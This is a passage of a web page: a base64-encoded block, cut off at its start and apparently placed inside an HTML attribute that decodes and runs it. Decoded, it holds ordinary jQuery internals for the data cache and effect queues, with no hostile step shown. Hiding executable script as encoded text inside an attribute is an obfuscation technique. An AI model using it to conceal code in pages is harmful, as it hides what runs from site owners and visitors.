LmNhY2hlW2NdID0ge30pLAogICAgICAgICAgICAgICAgICAgIGMKICAgICAgICAgICAgfSwKICAgICAgICAgICAgc2V0OiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICB2YXIgZCwgZSA9IHRoaXMua2V5KGEpLCBmID0gdGhpcy5jYWNoZVtlXTsKICAgICAgICAgICAgICAgIGlmICgic3RyaW5nIiA9PSB0eXBlb2YgYikKICAgICAgICAgICAgICAgICAgICBmW2JdID0gYzsKICAgICAgICAgICAgICAgIGVsc2UgaWYgKG4uaXNFbXB0eU9iamVjdChmKSkKICAgICAgICAgICAgICAgICAgICBuLmV4dGVuZCh0aGlzLmNhY2hlW2VdLCBiKTsKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICBmb3IgKGQgaW4gYikKICAgICAgICAgICAgICAgICAgICAgICAgZltkXSA9IGJbZF07CiAgICAgICAgICAgICAgICByZXR1cm4gZgogICAgICAgICAgICB9LAogICAgICAgICAgICBnZXQ6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgIHZhciBjID0gdGhpcy5jYWNoZVt0aGlzLmtleShhKV07CiAgICAgICAgICAgICAgICByZXR1cm4gdm9pZCAwID09PSBiID8gYyA6IGNbYl0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgYWNjZXNzOiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgICAgICB2YXIgZDsKICAgICAgICAgICAgICAgIHJldHVybiB2b2lkIDAgPT09IGIgfHwgYiAmJiAic3RyaW5nIiA9PSB0eXBlb2YgYiAmJiB2b2lkIDAgPT09IGMgPyAoZCA9IHRoaXMuZ2V0KGEsIGIpLAogICAgICAgICAgICAgICAgICAgIHZvaWQgMCAhPT0gZCA/IGQgOiB0aGlzLmdldChhLCBuLmNhbWVsQ2FzZShiKSkpIDogKHRoaXMuc2V0KGEsIGIsIGMpLAogICAgICAgICAgICAgICAgICAgIHZvaWQgMCAhPT0gYyA/IGMgOiBiKQogICAgICAgICAgICB9LAogICAgICAgICAgICByZW1vdmU6IGZ1bmN0aW9uKGEsIGIpIHsKICAgICAgICAgICAgICAgIHZhciBjLCBkLCBlLCBmID0gdGhpcy5rZXkoYSksIGcgPSB0aGlzLmNhY2hlW2ZdOwogICAgICAgICAgICAgICAgaWYgKHZvaWQgMCA9PT0gYikKICAgICAgICAgICAgICAgICAgICB0aGlzLmNhY2hlW2ZdID0ge307CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBuLmlzQXJyYXkoYikgPyBkID0gYi5jb25jYXQoYi5tYXAobi5jYW1lbENhc2UpKSA6IChlID0gbi5jYW1lbENhc2UoYiksCiAgICAgICAgICAgICAgICAgICAgICAgIGIgaW4gZyA/IGQgPSBbYiwgZV0gOiAoZCA9IGUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkID0gZCBpbiBnID8gW2RdIDogZC5tYXRjaChFKSB8fCBbXSkpLAogICAgICAgICAgICAgICAgICAgICAgICBjID0gZC5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKGMtLSkKICAgICAgICAgICAgICAgICAgICAgICAgZGVsZXRlIGdbZFtjXV0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSwKICAgICAgICAgICAgaGFzRGF0YTogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuICFuLmlzRW1wdHlPYmplY3QodGhpcy5jYWNoZVthW3RoaXMuZXhwYW5kb11dIHx8IHt9KQogICAgICAgICAgICB9LAogICAgICAgICAgICBkaXNjYXJkOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICBhW3RoaXMuZXhwYW5kb10gJiYgZGVsZXRlIHRoaXMuY2FjaGVbYVt0aGlzLmV4cGFuZG9dXQogICAgICAgICAgICB9CiAgICAgICAgfTsKICAgIHZhciBMID0gbmV3IEsKICAgICAgICAsIE0gPSBuZXcgSwogICAgICAgICwgTiA9IC9eKD86XHtbXHdcV10qXH18XFtbXHdcV10qXF0pJC8KICAgICAgICAsIE8gPSAvKFtBLVpdKS9nOwogICAgZnVuY3Rpb24gUChhLCBiLCBjKSB7CiAgICAgICAgdmFyIGQ7CiAgICAgICAgaWYgKHZvaWQgMCA9PT0gYyAmJiAxID09PSBhLm5vZGVUeXBlKQogICAgICAgICAgICBpZiAoZCA9ICJkYXRhLSIgKyBiLnJlcGxhY2UoTywgIi0kMSIpLnRvTG93ZXJDYXNlKCksCiAgICAgICAgICAgICAgICBjID0gYS5nZXRBdHRyaWJ1dGUoZCksCiAgICAgICAgICAgICJzdHJpbmciID09IHR5cGVvZiBjKSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGMgPSAidHJ1ZSIgPT09IGMgPyAhMCA6ICJmYWxzZSIgPT09IGMgPyAhMSA6ICJudWxsIiA9PT0gYyA/IG51bGwgOiArYyArICIiID09PSBjID8gK2MgOiBOLnRlc3QoYykgPyBuLnBhcnNlSlNPTihjKSA6IGMKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGUpIHt9CiAgICAgICAgICAgICAgICBNLnNldChhLCBiLCBjKQogICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgIGMgPSB2b2lkIDA7CiAgICAgICAgcmV0dXJuIGMKICAgIH0KICAgIG4uZXh0ZW5kKHsKICAgICAgICBoYXNEYXRhOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgIHJldHVybiBNLmhhc0RhdGEoYSkgfHwgTC5oYXNEYXRhKGEpCiAgICAgICAgfSwKICAgICAgICBkYXRhOiBmdW5jdGlvbihhLCBiLCBjKSB7CiAgICAgICAgICAgIHJldHVybiBNLmFjY2VzcyhhLCBiLCBjKQogICAgICAgIH0sCiAgICAgICAgcmVtb3ZlRGF0YTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICBNLnJlbW92ZShhLCBiKQogICAgICAgIH0sCiAgICAgICAgX2RhdGE6IGZ1bmN0aW9uKGEsIGIsIGMpIHsKICAgICAgICAgICAgcmV0dXJuIEwuYWNjZXNzKGEsIGIsIGMpCiAgICAgICAgfSwKICAgICAgICBfcmVtb3ZlRGF0YTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICBMLnJlbW92ZShhLCBiKQogICAgICAgIH0KICAgIH0pLAogICAgICAgIG4uZm4uZXh0ZW5kKHsKICAgICAgICAgICAgZGF0YTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgdmFyIGMsIGQsIGUsIGYgPSB0aGlzWzBdLCBnID0gZiAmJiBmLmF0dHJpYnV0ZXM7CiAgICAgICAgICAgICAgICBpZiAodm9pZCAwID09PSBhKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHRoaXMubGVuZ3RoICYmIChlID0gTS5nZXQoZiksCiAgICAgICAgICAgICAgICAgICAgMSA9PT0gZi5ub2RlVHlwZSAmJiAhTC5nZXQoZiwgImhhc0RhdGFBdHRycyIpKSkgewogICAgICAgICAgICAgICAgICAgICAgICBjID0gZy5sZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIChjLS0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnW2NdICYmIChkID0gZ1tjXS5uYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgMCA9PT0gZC5pbmRleE9mKCJkYXRhLSIpICYmIChkID0gbi5jYW1lbENhc2UoZC5zbGljZSg1KSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUChmLCBkLCBlW2RdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICBMLnNldChmLCAiaGFzRGF0YUF0dHJzIiwgITApCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHJldHVybiBlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICByZXR1cm4gIm9iamVjdCIgPT0gdHlwZW9mIGEgPyB0aGlzLmVhY2goZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgTS5zZXQodGhpcywgYSkKICAgICAgICAgICAgICAgIH0pIDogSih0aGlzLCBmdW5jdGlvbihiKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGMsIGQgPSBuLmNhbWVsQ2FzZShhKTsKICAgICAgICAgICAgICAgICAgICBpZiAoZiAmJiB2b2lkIDAgPT09IGIpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGMgPSBNLmdldChmLCBhKSwKICAgICAgICAgICAgICAgICAgICAgICAgdm9pZCAwICE9PSBjKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGM7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjID0gTS5nZXQoZiwgZCksCiAgICAgICAgICAgICAgICAgICAgICAgIHZvaWQgMCAhPT0gYykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBjOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoYyA9IFAoZiwgZCwgdm9pZCAwKSwKICAgICAgICAgICAgICAgICAgICAgICAgdm9pZCAwICE9PSBjKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGMKICAgICAgICAgICAgICAgICAgICB9IGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgdGhpcy5lYWNoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBNLmdldCh0aGlzLCBkKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE0uc2V0KHRoaXMsIGQsIGIpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLTEgIT09IGEuaW5kZXhPZigiLSIpICYmIHZvaWQgMCAhPT0gYyAmJiBNLnNldCh0aGlzLCBhLCBiKQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfSwgbnVsbCwgYiwgYXJndW1lbnRzLmxlbmd0aCA+IDEsIG51bGwsICEwKQogICAgICAgICAgICB9LAogICAgICAgICAgICByZW1vdmVEYXRhOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIE0ucmVtb3ZlKHRoaXMsIGEpCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICB9CiAgICAgICAgfSksCiAgICAgICAgbi5leHRlbmQoewogICAgICAgICAgICBxdWV1ZTogZnVuY3Rpb24oYSwgYiwgYykgewogICAgICAgICAgICAgICAgdmFyIGQ7CiAgICAgICAgICAgICAgICByZXR1cm4gYSA/IChiID0gKGIgfHwgImZ4IikgKyAicXVldWUiLAogICAgICAgICAgICAgICAgICAgIGQgPSBMLmdldChhLCBiKSwKICAgICAgICAgICAgICAgIGMgJiYgKCFkIHx8IG4uaXNBcnJheShjKSA/IGQgPSBMLmFjY2VzcyhhLCBiLCBuLm1ha2VBcnJheShjKSkgOiBkLnB1c2goYykpLAogICAgICAgICAgICAgICAgZCB8fCBbXSkgOiB2b2lkIDAKICAgICAgICAgICAgfSwKICAgICAgICAgICAgZGVxdWV1ZTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgYiA9IGIgfHwgImZ4IjsKICAgICAgICAgICAgICAgIHZhciBjID0gbi5xdWV1ZShhLCBiKQogICAgICAgICAgICAgICAgICAgICwgZCA9IGMubGVuZ3RoCiAgICAgICAgICAgICAgICAgICAgLCBlID0gYy5zaGlmdCgpCiAgICAgICAgICAgICAgICAgICAgLCBmID0gbi5fcXVldWVIb29rcyhhLCBiKQogICAgICAgICAgICAgICAgICAgICwgZyA9IGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIG4uZGVxdWV1ZShhLCBiKQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICJpbnByb2dyZXNzIiA9PT0gZSAmJiAoZSA9IGMuc2hpZnQoKSwKICAgICAgICAgICAgICAgICAgICBkLS0pLAogICAgICAgICAgICAgICAgZSAmJiAoImZ4IiA9PT0gYiAmJiBjLnVuc2hpZnQoImlucHJvZ3Jlc3MiKSwKICAgICAgICAgICAgICAgICAgICBkZWxldGUgZi5zdG9wLAogICAgICAgICAgICAgICAgICAgIGUuY2FsbChhLCBnLCBmKSksCiAgICAgICAgICAgICAgICAhZCAmJiBmICYmIGYuZW1wdHkuZmlyZSgpCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIF9xdWV1ZUhvb2tzOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICB2YXIgYyA9IGIgKyAicXVldWVIb29rcyI7CiAgICAgICAgICAgICAgICByZXR1cm4gTC5nZXQoYSwgYykgfHwgTC5hY2Nlc3MoYSwgYywgewogICAgICAgICAgICAgICAgICAgIGVtcHR5OiBuLkNhbGxiYWNrcygib25jZSBtZW1vcnkiKS5hZGQoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIEwucmVtb3ZlKGEsIFtiICsgInF1ZXVlIiwgY10pCiAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIH0KICAgICAgICB9KSwKICAgICAgICBuLmZuLmV4dGVuZCh7CiAgICAgICAgICAgIHF1ZXVlOiBmdW5jdGlvbihhLCBiKSB7CiAgICAgICAgICAgICAgICB2YXIgYyA9IDI7CiAgICAgICAgICAgICAgICByZXR1cm4gInN0cmluZyIgIT0gdHlwZW9mIGEgJiYgKGIgPSBhLAogICAgICAgICAgICAgICAgICAgIGEgPSAiZngiLAogICAgICAgICAgICAgICAgICAgIGMtLSksCiAgICAgICAgICAgICAgICAgICAgYXJndW1lbnRzLmxlbmd0aCA8IGMgPyBuLnF1ZXVlKHRoaXNbMF0sIGEpIDogdm9pZCAwID09PSBiID8gdGhpcyA6IHRoaXMuZWFjaChmdW5jdGlvbigpIHsKICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGMgPSBuLnF1ZXVlKHRoaXMsIGEsIGIpOwogICAgICAgICAgICAgICAgICAgICAgICBuLl9xdWV1ZUhvb2tzKHRoaXMsIGEpLAogICAgICAgICAgICAgICAgICAgICAgICAiZngiID09PSBhICYmICJpbnByb2dyZXNzIiAhPT0gY1swXSAmJiBuLmRlcXVldWUodGhpcywgYSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICB9LAogICAgICAgICAgICBkZXF1ZXVlOiBmdW5jdGlvbihhKSB7CiAgICAgICAgICAgICAgICByZXR1cm4gdGhpcy5lYWNoKGZ1bmN0aW9uKCkgewogICAgICAgICAgICAgICAgICAgIG4uZGVxdWV1ZSh0aGlzLCBhKQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgY2xlYXJRdWV1ZTogZnVuY3Rpb24oYSkgewogICAgICAgICAgICAgICAgcmV0dXJuIHRoaXMucXVldWUoYSB8fCAiZngiLCBbXSkKICAgICAgICAgICAgfSwKICAgICAgICAgICAgcHJvbWlzZTogZnVuY3Rpb24oYSwgYikgewogICAgICAgICAgICAgICAgdmFyIGMsIGQgPSAxLCBlID0gbi5EZWZlcnJlZCgpLCBmID0gdGhpcywgZyA9IHRoaXMubGVuZ3RoLCBoID0gZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgLS1kIHx8IGUucmVzb2x2ZVdpdGgoZiwgW2ZdKQogICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICJzdHJpbmciICE9IHR5cGVvZiBhICYmIChiID0gYSwKICAgICAgICAgICAgICAgICAgICBhID0gdm9pZCAwKSwKICAgICAgICAgICAgICAgICAgICBhID0gYSB8fCAiZngiOwogICAgICAgICAgICAgICAgd2hpbGUgKGctLSkKICAgICAgICAgICAgICAgICAgICBjID0gTC5nZXQoZltnXSwgYSArICJxdWV1ZUhvb2tzIiksCiAgICAgICAgICAgICAgICAgICAgYyAmJiBjLmVtcHR5ICYmIChkKyssCiAgICAgICAgICAgICAgICAgICAgICAgIGMuZW1wdHkuYWRkKGgpKTsKICAgICAgICAgICAgICAgIHJldHVybiBoKCksCiAgICAgICAgICAgICAgICAgICAgZS5wcm9taXNlKGIpCiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIHZhciBRID0gL1srLV0/KD86XGQqXC58KVxkKyg/OltlRV1bKy1dP1xkK3wpLy5zb3VyY2UKICAgICAgICAsIFIgPSBbIlRvcCIsICJSaWdodCIsICJCb3R0b20iLCAiTGVmdCJdCiAgICAgICAgLCBTID0gZnVuY3Rpb24oYSwgYikgewogICAgICAgIHJldHVybiBhID0gYiB8fCBhLAogICAgICAgICJub25lIiA9PT0gbi5jc3MoYSwgImRpc3BsYXkiKSB8fCAhbi5jb250YWlucyhhLm93bmVyRG9jdW1lbnQsIGEpCiAgICB9CiAgICAgICAgLCBU'))" />


